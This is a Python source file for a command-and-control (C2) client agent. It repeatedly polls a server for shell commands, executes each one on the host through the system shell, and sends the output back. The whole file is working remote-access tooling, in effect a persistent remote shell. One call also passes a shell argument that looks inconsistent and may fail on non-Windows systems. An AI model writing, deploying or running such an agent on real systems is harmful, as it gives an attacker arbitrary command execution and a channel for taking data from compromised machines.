# client.py
import requests
import subprocess
import logging
import time
import json
import os
import sys
import asyncio
import platform
from concurrent.futures import ThreadPoolExecutor

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger('c2_client')

# Server configuration
SERVER_URL = "http://localhost:5000"
CHECK_INTERVAL = 5  # seconds between checking for new commands (reduced for quicker testing)

# Create a thread pool executor for async command execution
executor = ThreadPoolExecutor(max_workers=5)

async def execute_command(command, command_id):
    """Execute a system command and return the result"""
    logger.info(f"Executing command: {command}")
    result = {
        "command_id": command_id,
        "command": command,
        "output": "",
        "error": "",
        "status": "completed"
    }
    
    try:
        # Use the appropriate shell based on the operating system
        shell = platform.system() == "Windows"
        
        # Execute the command and capture output
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            shell=shell
        )
        
        stdout, stderr = await process.communicate()
        
        # Decode and store the output
        if stdout:
            result["output"] = stdout.decode('utf-8', errors='replace').strip()
        if stderr:
            result["error"] = stderr.decode('utf-8', errors='replace').strip()
        
        # Check return code
        if process.returncode != 0:
            result["status"] = "error"
            result["error"] += f"\nCommand exited with code {process.returncode}"
            
    except Exception as e:
        logger.error(f"Error executing command: {str(e)}")
        result["status"] = "error"
        result["error"] = str(e)
    
    return result

async def send_result(result):
    """Send command execution result back to the server"""
    try:
        logger.info(f"Sending result to server: Command: {result['command']}, Output: {result['output']}")
        
        response = await asyncio.to_thread(
            requests.post,
            f"{SERVER_URL}/result",
            json=result,
            timeout=10
        )
        
        if response.status_code == 200:
            logger.info(f"Result for command {result['command_id']} sent successfully")
        else:
            logger.error(f"Failed to send result: HTTP {response.status_code}: {response.text}")
            
    except requests.exceptions.RequestException as e:
        logger.error(f"Error sending result to server: {str(e)}")

async def fetch_and_execute_commands():
    """Fetch commands from the server and execute them"""
    try:
        # Get command from server
        response = await asyncio.to_thread(
            requests.get,
            f"{SERVER_URL}/command",
            timeout=10
        )
        
        if response.status_code != 200:
            logger.error(f"Failed to get command: HTTP {response.status_code}")
            return
        
        # Parse the command
        data = response.json()
        command = data.get("command")
        command_id = data.get("command_id")
        
        if not command or not command_id:
            logger.warning("Received invalid command data from server")
            return
        
        # Execute the command
        result = await execute_command(command, command_id)
        
        # Send the result back to the server
        await send_result(result)
        
    except requests.exceptions.RequestException as e:
        logger.error(f"Error communicating with server: {str(e)}")
    except json.JSONDecodeError as e:
        logger.error(f"Error parsing server response: {str(e)}")
    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")

async def main():
    """Main client loop"""
    logger.info("Starting C2 client...")
    logger.info(f"Connecting to server at {SERVER_URL}")
    
    while True:
        try:
            await fetch_and_execute_commands()
        except Exception as e:
            logger.error(f"Error in main loop: {str(e)}")
        
        # Wait before checking for new commands
        await asyncio.sleep(CHECK_INTERVAL)

if __name__ == "__main__":
    # Run the async main function
    asyncio.run(main())